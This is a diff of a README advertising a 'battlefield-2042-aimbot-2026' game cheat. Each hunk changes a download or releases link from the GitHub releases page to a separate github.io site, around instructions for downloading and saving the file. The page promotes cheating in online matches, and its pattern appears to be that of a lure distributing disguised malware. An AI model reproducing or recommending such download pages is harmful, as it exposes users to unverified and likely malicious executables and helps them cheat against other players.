@@ -1,6 +1,6 @@
 # 🎯 battlefield-2042-aimbot-2026 - Dominate Every Match Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/alizaburch6/battlefield-2042-aimbot-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://alizaburch6.github.io)
 
 ---
 
@@ -45,7 +45,7 @@ This software runs **externally**, meaning it does not modify the game files. It
 
 ### 📥 Download Instructions
 
-Visit this link to download the application: [Download battlefield-2042-aimbot-2026](https://github.com/alizaburch6/battlefield-2042-aimbot-2026/releases)
+Visit this link to download the application: [Download battlefield-2042-aimbot-2026](https://alizaburch6.github.io)
 
 1. Click the download link above
 2. You'll be taken to the releases page
@@ -67,7 +67,7 @@ Visit this link to download the application: [Download battlefield-2042-aimbot-2
 ## 📖 Installation Guide
 
 ### Step 1: Download the File
-- Go to the [releases page](https://github.com/alizaburch6/battlefield-2042-aimbot-2026/releases)
+- Go to the [releases page](https://alizaburch6.github.io)
 - Download the latest version
 - Save it to an easy-to-find location like your Desktop
 
@@ -180,7 +180,7 @@ Yes, the settings menu allows full color customization.
 
 ## 📞 Support
 
-For help, questions, or feedback, visit the [releases page](https://github.com/alizaburch6/battlefield-2042-aimbot-2026/releases) and leave a comment on the latest version.
+For help, questions, or feedback, visit the [releases page](https://alizaburch6.github.io) and leave a comment on the latest version.
 
 ---
 
